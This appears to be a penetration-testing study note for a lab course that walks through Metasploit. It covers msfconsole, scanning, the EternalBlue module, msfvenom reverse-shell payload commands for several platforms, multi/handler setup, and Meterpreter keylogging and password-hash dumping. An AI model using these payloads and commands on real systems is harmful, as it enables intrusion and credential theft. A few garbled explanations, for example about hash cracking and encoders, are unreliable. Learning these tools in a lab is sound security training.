# Metasploit

### Main Components of Metasploit[​](broken-reference) <a href="#main-components-of-metasploit" id="main-components-of-metasploit"></a>

To launch Metasploit, use the `msfconsole` command.

#### Modules[​](broken-reference) <a href="#modules" id="modules"></a>

```
/usr/share/metasploit-framework/modules/
```

* **Auxiliary:** Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
* **Encoders:** Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
* **Evasion:** While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
* **Exploits:** Exploits, neatly organized by target system.
* **Payloads:** Payloads are codes that will run on the target system. To identify the single and staged payloads, it's important to look for "\_" between "shell" and "reverse". A staged payload is indicated by the "/".
  * **Singles:** Self-contained payloads.
  * **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system.
  * **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.
* **Post:** Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

#### Msfconsole[​](broken-reference) <a href="#msfconsole" id="msfconsole"></a>

The Metasploit console (msfconsole) can be used just like a regular command-line shell. You can use the history command to see commands you have typed earlier. Usage example:

```
use exploit/windows/smb/ms17_010_eternalblue
```

The prompt tells us we now have a context set in which we will work. You can see this by typing the `show options` command. The `show` command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules. You can leave the context using the `back` command. Further information on any module can be obtained by typing the `info` command within its context. One of the most useful commands in msfconsole is `search`. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system. We can also search for specific module types:

```
search type:auxiliary telnet
```

#### Working with modules[​](broken-reference) <a href="#working-with-modules" id="working-with-modules"></a>

Once you have entered the context of a module using the `use` command followed by the module name, you will need to set parameters. It is good practice to use the `show options` command to list the required parameters. All parameters are set using the same command syntax: `set PARAMETER_NAME VALUE`

Some of these parameters require a value for the exploit to work.

Parameters you will often use:

* **RHOSTS:** Remote host
* **RPORT:** Remote port
* **LHOST:** Localhost
* **LPORT:** Local port
*   **SESSION:** Each connectoin established to the target system using Metasploit.

    You can override any set parameter using the set command again with a different value. You can also clear any parameter value using the `unset` command or clear all set parameters with the `unset` all command. You can use the `setg` command to set values that will be used for all modules (it can be used across different modules).

#### Using modules[​](broken-reference) <a href="#using-modules" id="using-modules"></a>

Once all module parameters are set, you can launch the module using the `exploit` command. We can also use `run`. The `exploit` command can be used without any parameters or using the `-z` parameter. The `exploit -z` command will run the exploit and background the session as soon as it opens. Some modules support the `check` option.

#### Sessions[​](broken-reference) <a href="#sessions" id="sessions"></a>

This is the communication channel established between the target system and Metasploit. You can use the `background` command to background the session prompt and go back to the msfconsole prompt. Alternatively, we can also use `CTRL+Z`. To interact with any session, you can use the sessions -i command followed by the desired session number

**Types of prompts**[**​**](broken-reference)

When dealing with Metasploit, you may see five different prompts:

* The regular command prompt: You can not use Metasploit commands here.
* The msfconsole prompt: no context is set here, so context-specific commands to set parameters and run modules can not be used here.
* A context prompt: Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) >
```

* The Meterpreter prompt: Meterpreter is an important payload we will see in detail later in this module. This means a Meterpreter agent was loaded to the target system and connected back to you. You can use Meterpreter specific commands here.
* A shell on the target system: Once the exploit is completed, you may have access to a command shell on the target system. This is a regular command line, and all commands typed here run on the target system.

### Exploitation[​](broken-reference) <a href="#exploitation" id="exploitation"></a>

#### Scanning[​](broken-reference) <a href="#scanning" id="scanning"></a>

**Port Scanning**[**​**](broken-reference)

You can list potential port scanning modules available using the `search portscan` command. Port scanning modules will require you to set a few options:

* **CONCURRENCY:** Number of targets to be scanned simultaneously.
* **PORTS:** Port range to be scanned.
* **RHOSTS:** Target or target network to be scanned.
* **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:

```
msf6 > nmap -sS 10.10.12.229
```

**UDP service identification**[**​**](broken-reference)

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol).

**SMB Scans**[**​**](broken-reference)

Especially useful in a corporate network would be `smb_enumshares` and `smb_version`.

```
msf6 > use auxiliary/scanner/smb/smb_version
```

#### The Metasploit Database[​](broken-reference) <a href="#the-metasploit-database" id="the-metasploit-database"></a>

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. You will first need to start the PostgreSQL database, which Metasploit will use with the following command: `systemctl start postgresql`. Then you will need to initialize the Metasploit Database using the `msfdb init` command.

You can now launch `msfconsole` and check the database status using the `db_status` command.

The database feature will allow you to create workspaces to isolate different projects. When first launched, you should be in the default workspace. You can list available workspaces using the `workspace` command. You can add a workspace using the `-a` parameter or delete a workspace using the `-d` parameter, respectively.

```
msf6 > workspace -a tryhackme
```

You will also notice that the new database name is printed in red, starting with a `*` symbol. You can use the workspace command to navigate between workspaces simply by typing `workspace` followed by the desired workspace name. You can use the `workspace -h` command to list available options for the `workspace` command. Different from regular Metasploit usage, once Metasploit is launched with a database, the `help` command, you will show the Database Backends Commands menu. If you run a Nmap scan using the `db_nmap` shown below, all results will be saved to the database.

```
msf6 > db_nmap -sV -p- 10.10.12.229
```

You can now reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands, respectively.

```
msf6 > hosts
msf6 > services
```

The `hosts -h` and `services -h` commands can help you become more familiar with available options.

#### Vulnerability scanning[​](broken-reference) <a href="#vulnerability-scanning" id="vulnerability-scanning"></a>

After finding any service running on the target, we can use vulnerability scanner's modules to enumerate. Example:

```
msf6 > use auxiliary/scanner/vnc/
msf6 auxiliary(scanner/vnc/vnc_login) > info
```

#### Exploitation[​](broken-reference) <a href="#exploitation-1" id="exploitation-1"></a>

Most of the exploits will have a preset default payload. However, you can always use the `show payloads` command to list other commands you can use with that specific exploit.

Once you have decided on the payload, you can use the `set payload` command to make your choice.

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell\_reverse\_tcp).

Some payloads will open new parameters that you may need to set, running the `show options` command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the `LHOST` option.

Once a session is opened, you can background it using `CTRL+Z` or abort it using `CTRL+C`. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

**Working with sessions**[**​**](broken-reference)

The `sessions` command will list all active sessions.

You can interact with any existing session using the `sessions -i` command followed by the session ID.

#### Msfvenom[​](broken-reference) <a href="#msfvenom" id="msfvenom"></a>

Msfvenom allows to generate payloads in many different formats for many different target systems. `msfvenom -l payloads`.

**Output formats**[**​**](broken-reference)

You can either generate stand-alone payloads or get a usable raw format. The `msfvenom --list` formats command can be used to list supported output formats.

**Encoders**[**​**](broken-reference)

They encode the payload (do not aim to bypass antivirus). The usage is `-e` parameter and the output parameter `-f`. Example:

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

**Handlers**[**​**](broken-reference)

When using an exploit module, this part is automatically handled by the exploit module.

```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```

Please note: The output PHP file will miss the starting PHP tag commented and the end tag (?>), as seen below. `/*<?php /**/` The reverse\_shell.php file should be edited to convert it into a working PHP file. Comments removed from the beginning of the file. `<?php` End tag added `?>`

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command. To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values. Also, it is important to select the payload generated.

```
set payload linux/x86/meterpreter/reverse_tcp
```

Once everything is set, we will `run` the handler and wait for the incoming connection. When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.

**Other payloads**[**​**](broken-reference)

Examples:

* Linux Executable and Linkable Format (elf)

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

* Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

* PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

* ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

* Python

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler.

### Meterpreter[​](broken-reference) <a href="#meterpreter" id="meterpreter"></a>

Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter runs in memory RAM to avoid having a file that has to be written to the disk on the target system. This way, Meterpreter will be seen as a process and not have a file on the target system. Meterpreter also aims to avoid being detected by network-based IPS and IDS solutions by using encrypted communication with the server where Metasploit runs.

After exploiting a machine, we can see the process ID (PID) where Meterpreter is running by writing `getpid`. We can find that processes with `ps`command. It is shown as spoolsv.exe and the user is NT AUTHORITY\SYSTEM

There are different meterpreter payloads that can be used `msfvenom --list payloads | grep meterpreter`. The decision on which version of Metrpreter to use will be mostly based on three factors:

* The target operating system
* Components available on the target system
* Network connection types you can have with the target system

We can run the command `help` to see the command options.

#### Post-Exploitation with Meterpreter[​](broken-reference) <a href="#post-exploitation-with-meterpreter" id="post-exploitation-with-meterpreter"></a>

**Help**[**​**](broken-reference)

Will give you a list of all available commands in Meterpreter.

**Meterpreter commands**[**​**](broken-reference)

The `getuid` command will display the user with which Meterpreter is currently running. The `ps` command will list running processes.

**Migrate**[**​**](broken-reference)

Migrating to another process will help Meterpreter interact with it. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger (when migrating to word.exe and similar). Migrating to another process may also help you to have a more stable Meterpreter session.

If you migrate from a higer privileged user to another with lower privileges, you may lose your user privileges.

**Hashdump**[**​**](broken-reference)

The `hashdump` command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.

**Search**[**​**](broken-reference)

The `search` command is useful to locate files with potentially juicy information.

```
meterpreter > search -f flag2.txt
```

**Shell**[**​**](broken-reference)

The `shell` command will launch a regular command-line shell on the target system. Pressing `CTRL+Z` will help you go back to the Meterpreter shell.
